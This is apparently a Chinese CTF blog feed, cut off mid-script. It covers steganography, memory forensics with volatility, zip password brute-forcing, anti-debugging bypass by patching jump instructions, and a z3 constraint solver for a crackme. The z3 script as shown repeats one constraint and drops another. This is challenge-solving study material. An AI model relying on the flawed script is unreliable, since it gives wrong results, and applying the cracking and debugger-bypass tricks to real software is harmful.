href="https://www.yunyansec.com/#/experiment/expdetail/3">https://www.yunyansec.com/#/experiment/expdetail/3</a></p><p>无字天书</p><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>得到流量包，导出HTTP对象</p><p>得到几个文件，依次查看，注意要仔细看，流量包文件有时候会很多</p><p><img src="/2022/01/15/zip/1642254197336.png"></p><p>发现了504b0304，可以写脚本，也可以直接网站解码得到压缩包</p><p><a href="https://the-x.cn/zh-cn/encodings/Hex.aspx">https://the-x.cn/zh-cn/encodings/Hex.aspx</a></p><p><img src="/2022/01/15/zip/1642254255927.png"></p><p>也可以使用脚本</p><pre class="language-python" data-language="python"><code class="language-python">s='填写16进制数据'import binasciiout=open('2.jpg','wb')out.write(binascii.unhexlify(s))out.close()#Author: MoChu7import structa = open("str.txt","r")#十六进制数据文件lines = a.read()res = [lines[i:i+2] for i in range(0,len(lines),2)]with open("res.jpg","wb") as f:for i in res:s = struct.pack('B',int(i,16))f.write(s)</code></pre><p>打开之后得到两个文件，打开里面什么都看不到，全选就会有显示，key.ws应该是snow的密码，拿去whitespace解密</p><p><img src="/2022/01/15/zip/1642254325041.png"></p><p>然后snow解密 命令：SNOW.EXE -p 密码 -C 文件</p><p><img src="/2022/01/15/zip/1642254470293.png"></p><p>cazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng}</p><h1 id="爆破压缩包"><a href="#爆破压缩包" class="headerlink" title="爆破压缩包"></a>爆破压缩包</h1><p>使用工具爆破，如Advanced Archive Password Recovery</p><h2 id="已知明文攻击"><a href="#已知明文攻击" class="headerlink" title="已知明文攻击"></a>已知明文攻击</h2><h2 id="掩码攻击"><a href="#掩码攻击" class="headerlink" title="掩码攻击"></a>掩码攻击</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文档隐写</title>
      <link href="/2022/01/15/%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/15/%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>可以看看这篇<a href="https://xz.aliyun.com/t/1883/">https://xz.aliyun.com/t/1883/</a></p><h1 id="WORD"><a href="#WORD" class="headerlink" title="WORD"></a>WORD</h1><h2 id="xml隐藏信息"><a href="#xml隐藏信息" class="headerlink" title="xml隐藏信息"></a>xml隐藏信息</h2><h2 id="隐藏文字"><a href="#隐藏文字" class="headerlink" title="隐藏文字"></a>隐藏文字</h2><h2 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h2><h1 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h1><h2 id="图片遮挡"><a href="#图片遮挡" class="headerlink" title="图片遮挡"></a>图片遮挡</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>视频隐写</title>
      <link href="/2022/01/15/%E8%A7%86%E9%A2%91%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/15/%E8%A7%86%E9%A2%91%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="Kinovea"><a href="#Kinovea" class="headerlink" title="Kinovea"></a>Kinovea</h1><p>可以一帧一帧地看视频，视频隐写目前只接触到在视频一些 帧里面藏信息</p><p><a href="https://mochu.blog.csdn.net/article/details/109461931">https://mochu.blog.csdn.net/article/details/109461931</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析</title>
      <link href="/2022/01/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>只试过直接导出HTTP流对象</p><p><img src="/2022/01/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1642297780618.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>volatility是内存取证的工具，这里我使用的是打包好了的可执行文件</p><p>volatility下载地址：<a href="https://www.volatilityfoundation.org/releases">https://www.volatilityfoundation.org/releases</a></p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642229196730.png"></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目链接：</p><p><a href="https://www.yunyansec.com/#/experiment/expdetail/3">https://www.yunyansec.com/#/experiment/expdetail/3</a></p><p>朴实无华的取证</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><p>先使用命令volatility -f 朴实无华的取证.raw iamgeinfo查看系统信息</p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642230119786.png"></p><p>上面的系统都有可能，主要是第一个</p><h2 id="查看运行程序列表"><a href="#查看运行程序列表" class="headerlink" title="查看运行程序列表"></a>查看运行程序列表</h2><p>命令：volatility -f 朴实无华的取证.raw –profile=WinXPSP2x86 pslist</p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642230482092.png"></p><p>这里有三处需要注意，mspaint是画图工具，360zip是解压工具，notepad是笔记本，接下来重点放在这几处</p><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>命令：volatility -f 朴实无华的取证.raw –profile=WinXPSP2x86  filescan，这里可以使用grep来指定搜索的字符串 格式如下：volatility -f 朴实无华的取证.raw –profile=WinXPSP2x86  filescan | grep flag</p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642230787104.png"></p><p>可以看到过滤出了flag的相关数据</p><h2 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h2><p>接下来需要把文件dump下来，命令：volatility -f 朴实无华的取证.raw –profile=WinXPSP2x86 dumpfiles -Q 偏移量 -D ./(-D指定文件夹，这里aaa表示存储到aaa文件夹中)</p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642231017652.png"></p><p>可以在aaa文件夹中找到dump下来的文件</p><p>得到<img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642231186454.png"></p><p>还有一个加了密的zip文件，这时候注意我们的notepad还没有被使用，可以去看看信息</p><h2 id="打开进程"><a href="#打开进程" class="headerlink" title="打开进程"></a>打开进程</h2><p>命令：volatility -f 朴实无华的取证.raw –profile=WinXPSP2x86 notepad</p><p><img src="/2022/01/15/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/1642231403984.png"></p><p>这样就得到了encrypt的密码</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt; int main(){char str[]="FDCB[8LDQ?ZLOO?FHUWDLQ)B?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]";for(int i = 0; i &lt; strlen(str); i++){str[i] += 32;if(str[i] &gt;='a'+3 &amp;&amp; str[i]&lt;='w'+3)str[i]-=3;else if(str[i]=='a')str[i]='x';else if(str[i]=='b')str[i]='y';else if(str[i]=='c')str[i]='z';else if(str[i]=='|')str[i]='_';}printf("%s",str);return 0;}</code></pre><p>得到flag：cazy{Xian_will_certainIy_succeed_in_fighting_the_epidemic}</p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音频隐写</title>
      <link href="/2022/01/15/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/15/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>在这篇文章：<a href="https://blog.csdn.net/vanarrow/article/details/105667244">https://blog.csdn.net/vanarrow/article/details/105667244</a></p><h1 id="摩斯电码"><a href="#摩斯电码" class="headerlink" title="摩斯电码"></a>摩斯电码</h1><h1 id="MP3steg"><a href="#MP3steg" class="headerlink" title="MP3steg"></a>MP3steg</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片隐写</title>
      <link href="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
      <url>/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="PNG和JPG文件结构"><a href="#PNG和JPG文件结构" class="headerlink" title="PNG和JPG文件结构"></a>PNG和JPG文件结构</h1><p>PNG：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8986391.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8986391.html</a>   （有题目需要修改PNG宽高），结尾是IEND</p><p><a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics#File_format">https://en.wikipedia.org/wiki/Portable_Network_Graphics#File_format</a></p><p>JPG：<a href="https://www.cnblogs.com/bandy/p/4956086.html">https://www.cnblogs.com/bandy/p/4956086.html</a></p><p>jpg的一些隐写：<a href="https://zhuanlan.zhihu.com/p/24054040">https://zhuanlan.zhihu.com/p/24054040</a></p><p>无论是png还是jpg，只会识别到文件尾，所以可以在文件尾加入信息</p><h1 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h1><h1 id="Stegpy隐写"><a href="#Stegpy隐写" class="headerlink" title="Stegpy隐写"></a>Stegpy隐写</h1><p>之前有过题了，就不说了，讲讲下载</p><p>看这篇就够了</p><p><a href="https://blog.csdn.net/Amherstieae/article/details/109010064">https://blog.csdn.net/Amherstieae/article/details/109010064</a></p><h1 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h1><p><a href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#%E4%B9%9D%E8%BF%9E%E7%8E%AF">https://buuoj.cn/challenges#%E4%B9%9D%E8%BF%9E%E7%8E%AF</a></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>binwalk分解文件</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642302431480.png"></p><p>伪加密</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642302894034.png"></p><p>得到图片和加密压缩包</p><p>对图片使用steghide</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642302996915.png"></p><p>steghide info 文件查看隐藏信息，输入y后提取，也可以直接：steghide extract 文件 </p><p>找到ko.txt,得到压缩包密码</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><h1 id="Binwalk、Winrar——图片隐藏文件"><a href="#Binwalk、Winrar——图片隐藏文件" class="headerlink" title="Binwalk、Winrar——图片隐藏文件"></a>Binwalk、Winrar——图片隐藏文件</h1><p>binwalk使用：<a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">https://blog.csdn.net/wxh0000mm/article/details/85683661</a></p><p>可以直接binwalk提取文件，命令：binwalk -e 文件，这个比较常见，就不说了</p><p>winrar也可以直接打开被隐藏的文件</p><h1 id="修改图片宽高"><a href="#修改图片宽高" class="headerlink" title="修改图片宽高"></a>修改图片宽高</h1><pre class="language-python" data-language="python"><code class="language-python">import binasciiimport structimport sysfile = input("图片地址：")fr = open(file,'rb').read()data = bytearray(fr[0x0c:0x1d])crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])#原来的代码: crc32key = eval(str(fr[29:33]).replace('\\x','').replace("b'",'0x').replace("'",''))n = 4095for w in range(n):    width = bytearray(struct.pack('&gt;i', w))    for h in range(n):        height = bytearray(struct.pack('&gt;i', h))        for x in range(4):            data[x+4] = width[x]            data[x+8] = height[x]        crc32result = binascii.crc32(data) &amp; 0xffffffff        if crc32result == crc32key:            print(width,height)            newpic = bytearray(fr)            for x in range(4):                newpic[x+16] = width[x]                newpic[x+20] = height[x]            fw = open(file+'.png','wb')            fw.write(newpic)            fw.close            sys.exit()</code></pre><h1 id="二进制转二维码"><a href="#二进制转二维码" class="headerlink" title="二进制转二维码"></a>二进制转二维码</h1><pre class="language-python" data-language="python"><code class="language-python">from PIL import Imagefrom zlib import *MAX = 25pic = Image.new("RGB",(MAX,MAX))str ='''0000000001110010000000000000000000001111010000000000000000011100010000000000000000010111100000000000000000001010101000000000000000000011000101000000000000000010101010100000000000000000100000110000000011000111011101101000110000001000010110010010010100010011110100001110111001100111101001010110010010011000001001100001001101000111100011111101110010100010110111110011011111101111000110110010010101101100100011110011111111111011100000000101100011000101000000000010010100101010001000000001010101010001100100000000001001111111100100000000000011001011110111000000000100110010010000100000000110000110110110010000000011010000101110101'''i=0for y in range(0,MAX):    for x in range(0,MAX):        if(str[i] == '1'):            pic.putpixel([x,y],(0,0,0))        else:pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save("flag.png")</code></pre><h1 id="坐标画图"><a href="#坐标画图" class="headerlink" title="坐标画图"></a>坐标画图</h1><h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><p>linux，直接sudo apt install gnuplot，使用 直接gnuplot进入后，plot 文件名，就可以了</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#%E6%A2%85%E8%8A%B1%E9%A6%99%E4%B9%8B%E8%8B%A6%E5%AF%92%E6%9D%A5">https://buuoj.cn/challenges#%E6%A2%85%E8%8A%B1%E9%A6%99%E4%B9%8B%E8%8B%A6%E5%AF%92%E6%9D%A5</a></p><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642300357300.png"></p><p>在文件尾之后发现大量十六进制数据，这里我使用010editor复制，这样比较快，复制后转为字符</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642300558126.png"></p><p>这样的格式不能被识别，所以需要替换，我使用的是VS</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642301030524.png"></p><p>替换这里不用填写，直接替换全部，然后保存到txt中，再使用工具</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642301392143.png"></p><h1 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h1><p>在stegsolve可以实现，逐帧查看，注意不要漏了</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642304858835.png"></p><h1 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h1><h1 id="文件头尾倒置"><a href="#文件头尾倒置" class="headerlink" title="文件头尾倒置"></a>文件头尾倒置</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p><a href="https://www.yunyansec.com/#/experiment/expdetail/3">https://www.yunyansec.com/#/experiment/expdetail/3</a></p><p>pipicc</p><h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><p>得到一张图片</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642303873774.png"></p><p>有噪点，应该是修改了像素点，是需要修复的</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306122403.png"></p><p>缺少png文件头，修补文件头</p><p>接下来找到IEND块,将多余部分删去，改为png</p><p>得到</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306518311.png"></p><p>拖进stegsolve</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306719043.png"></p><p>在蓝色低位发现了d9ff，这正好是jpg的文件尾反过来，save bin 下来，搜索d8ff，对应倒置的文件头</p><p>010editor有工具</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306907507.png"></p><p>需要安装</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306934016.png"></p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642306975753.png"></p><p>逆序后保存改为jpg后缀，得到图片</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642307072291.png"></p><p>也可以使用脚本</p><pre class="language-python" data-language="python"><code class="language-python">input = open('D:\\new\\5', 'rb')input_all = input.read()ss = input_all[::-1]output = open('m0re.jpg', 'wb')output.write(ss)input.close()output.close()</code></pre><h1 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h1><pre class="language-python" data-language="python"><code class="language-python">import base64path = input("请输入加密文件路径\n")file = open(path)a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"aaa = ''while True:    text = file.readline()  # 只读取一行内容    # 判断是否读取到内容    text = text.replace("\n", "")    if not text:        break    if text.count('=') == 1:        aaa = aaa + \            str('{:02b}'.format((a.find(text[len(text)-2])) % 4))    if text.count('=') == 2:        aaa = aaa + \            str('{:04b}'.format((a.find(text[len(text)-3])) % 16))file.close()t = ""ttt = len(aaa)ttt = ttt//8*8for i in range(0,ttt,8):    t = t + chr(int( aaa[i:i+8],2))print(t)</code></pre><h1 id="StegSolve"><a href="#StegSolve" class="headerlink" title="StegSolve"></a>StegSolve</h1><h2 id="两张图片拼接"><a href="#两张图片拼接" class="headerlink" title="两张图片拼接"></a>两张图片拼接</h2><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642312404099.png"></p><p>提取http对象</p><p>把scanlines拖进stegsolve，在多个通道发现了一条横线</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642312485498.png"></p><p>而logo正好缺了一段</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642312592372.png"></p><p>使用stegsolve的图像结合</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642312633974.png"></p><p>得到flag</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642312671617.png"></p><h1 id="添加文件头"><a href="#添加文件头" class="headerlink" title="添加文件头"></a>添加文件头</h1><h1 id="文件属性藏信息"><a href="#文件属性藏信息" class="headerlink" title="文件属性藏信息"></a>文件属性藏信息</h1><p>图片属性可以隐藏信息</p><h1 id="outguess隐写"><a href="#outguess隐写" class="headerlink" title="outguess隐写"></a>outguess隐写</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]alison_likes_jojo">https://buuoj.cn/challenges#[WUSTCTF2020]alison_likes_jojo</a></p><h2 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h2><p>binwalk分解boki.png得到压缩包，是真加密</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642311449760.png"></p><p>尝试爆破</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642311499706.png"></p><p>得到一段字符串</p><p>base64三次得到killerqueen</p><p>另一张图片是outguess隐写</p><p><img src="/2022/01/15/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/1642311787198.png"></p><p>打开flag1.txt文件</p><p>wctf2020{pretty_girl_alison_likes_jojo}</p><h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><h2 id="BlindWaterMark"><a href="#BlindWaterMark" class="headerlink" title="BlindWaterMark"></a>BlindWaterMark</h2><h1 id="点阵提取"><a href="#点阵提取" class="headerlink" title="点阵提取"></a>点阵提取</h1><pre class="language-python" data-language="python"><code class="language-python"># from PIL import Image## img = Image.open('D:\\new\\cat.png')# width, height = img.size# pixs_list = []# for w in range(5, width, 11):# for h in range(5, height, 11):# pix = img.getpixel((w, h))# pixs_list.append(pix)# #分解下pixs_list的长度，就可以得到生成图片的宽高# new_width, new_height = 215, 215# new_img = Image.new('RGB', (new_width, new_height))# idx = 0# for n_w in range(new_width):# for n_h in range(new_height):# new_img.putpixel((n_w, n_h), pixs_list[idx])# idx += 1# new_img.save('ok.png')# new_img.show()# from PIL import Image## img = Image.open('ok.png')# width, height = img.size# pixs_list = []# for w in range(2, width, 5):# for h in range(2, height, 5):# pix = img.getpixel((w, h))# pixs_list.append(pix)# #分解pixs_list的长度，# new_width, new_height = 43, 43# new_img = Image.new('RGB', (new_width, new_height))# idx = 0# for n_w in range(new_width):# for n_h in range(new_height):# new_img.putpixel((n_w, n_h), pixs_list[idx])# idx += 1# new_img.save('ok1.png')# new_img.show()from PIL import Imageimg = Image.open('ok1.png')if img.mode == "P":    img = img.convert("RGB")assert img.size[0] == img.size[1]dim = width, height = img.sizest = 1a = 9b = 39for _ in range(st):    with Image.new(img.mode, dim) as canvas:        for nx in range(img.size[0]):            for ny in range(img.size[0]):                y = (ny - nx * a) % width                x = (nx - y * b) % height                canvas.putpixel((y, x), img.getpixel((ny, nx)))canvas.show()canvas.save('ok2.png')</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A&amp;D1</title>
      <link href="/2021/12/27/A-D1/"/>
      <url>/2021/12/27/A-D1/</url>
      
        <content type="html"><![CDATA[<h1 id="IsDebugger-Present"><a href="#IsDebugger-Present" class="headerlink" title="IsDebugger Present"></a>IsDebugger Present</h1><p><strong>原理</strong></p><hr><p>​          反调试，该API查询PEB结构中的IsDebugger标志位， 未调试返回0，调试状态返回1。</p><p><strong>绕过</strong></p><hr><ol><li><p>nop指令</p> <pre class="language-none"><code class="language-none">mov rax ; IsDebuggerPresentcall rax ; IsDebuggerPresent</code></pre></li><li><p>jnz和jz</p><hr><p> jnz在结果不为0时跳转，jz在结果为0时跳转</p> <pre class="language-none"><code class="language-none">sub_4019F4(){    return ISDebuggerPresent;}if(!sub_4019F4){     puts();}</code></pre><p> 这个时候如果处于调试状态，返回1，不会执行put，这时候只需要去汇编指令处把jnz改为jz，重新汇编后会变成</p> <pre class="language-none"><code class="language-none">sub_4019F4(){    return ISDebuggerPresent;}if(sub_4019F4){     puts();}</code></pre><p> 3.Attach to process</p> <pre class="language-none"><code class="language-none">sub_4019F4();printf("%d",n);scanf("%d",&amp;m);</code></pre><p> 可以先让程序运行，这时候已经步过了反调试函数，然后Attach to process就可以调试了</p><p> 4.修改EIP：jump、call、ret指令</p></li></ol><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><ol><li><p>函数介绍</p> <pre class="language-none"><code class="language-none">1 CreateThread 创建线程2 CloseHandle 关闭线程3 WaitForSingleObject() 实现线程转换</code></pre></li></ol><p>​      2.题目——Youngter drive</p><pre class="language-none"><code class="language-none">int __cdecl main_0(int argc, const char **argv, const char **envp){  HANDLE v4; // [esp+D0h] [ebp-14h]  HANDLE hObject; // [esp+DCh] [ebp-8h]  ((void (*)(void))sub_4110FF)();  ::hObject = CreateMutexW(0, 0, 0);  j_strcpy(Destination, &amp;Source);  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);  v4 = CreateThread(0, 0, sub_41119F, 0, 0, 0);  CloseHandle(hObject);  CloseHandle(v4);  while ( dword_418008 != -1 )    ;  sub_411190();  CloseHandle(::hObject);  return 0;}</code></pre><pre class="language-none"><code class="language-none">void __stdcall StartAddress_0(int a1){  while ( 1 )  {    WaitForSingleObject(hObject, 0xFFFFFFFF);    if ( dword_418008 &gt; -1 )    {      sub_41112C(&amp;Source, dword_418008);      --dword_418008;      Sleep(0x64u);    }    ReleaseMutex(hObject);  }}</code></pre><pre class="language-none"><code class="language-none">void __stdcall sub_411B10(int a1){  while ( 1 )  {    WaitForSingleObject(hObject, 0xFFFFFFFF);    if ( dword_418008 &gt; -1 )    {      Sleep(0x64u);      --dword_418008;    }    ReleaseMutex(hObject);  }}</code></pre><p>实际上就是每隔两位对数组元素做一次处理</p><h1 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h1><ol><li><p>基础</p> <pre class="language-none"><code class="language-none">1 声明整数x = Int('x')2 声明实数x = Real('x')3 声明布尔类型x = Bool('x')1 创建solver求解器   例：s = Solver()2 添加约束条件   例：s.add(x+y==10)3 检查solver中的约束是否满足   例：s.check()4 利用model()输出运算结果   例：s.model()</code></pre><p> 2.题目——Universe_final_answer</p> <pre class="language-none"><code class="language-none">__int64 __fastcall main(int a1, char **a2, char **a3){  char v4[32]; // [rsp+0h] [rbp-A8h] BYREF  char input[104]; // [rsp+20h] [rbp-88h] BYREF  unsigned __int64 v6; // [rsp+88h] [rbp-20h]  v6 = __readfsqword(0x28u);  __printf_chk(1LL, "Please give me the key string:", a3);  scanf("%s", input);  if ( sub_860(input) )  {    sub_C50(input, v4);    __printf_chk(1LL, "Judgement pass! flag is actf{%s_%s}\n", input);  }  else  {    puts("False key!");  }  return 0LL;}</code></pre> <pre class="language-none"><code class="language-none">bool __fastcall sub_860(char *input){  int v1; // ecx  int v2; // esi  int v3; // edx  int v4; // er9  int v5; // er11  int v6; // ebp  int v7; // ebx  int v8; // er8  int v9; // er10  bool result; // al  int v11; // [rsp+0h] [rbp-38h]  v1 = input[1];  v2 = *input;  v3 = input[2];  v4 = input[3];  v5 = input[4];  v6 = input[6];  v7 = input[5];  v8 = input[7];  v9 = input[8];  result = 0;  if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613 )  {    v11 = input[9];    if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400      &amp;&amp; -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 &lt;&lt; 6) - 120 * v9 == -10283      &amp;&amp; 71 * v6 + (v7 &lt;&lt; 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855      &amp;&amp; 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944      &amp;&amp; -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222      &amp;&amp; -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258      &amp;&amp; 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559      &amp;&amp; 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308 )    {      result = 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697;    }  }  return result;}</code></pre><p> 脚本</p> <pre class="language-none"><code class="language-none">from z3 import*s=Solver()v1=Int('v1')v2=Int('v2')v3=Int('v3')v4=Int('v4')v5=Int('v5')v6=Int('v6')v7=Int('v7')v8=Int('v8')v9=Int('v9')v11=Int('v11')s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)s.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 *64) - 120 * v9 == -10283)s.add(71 * v6 + (v7 *128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855)s.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944)s.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222)s.add(-83 * v11 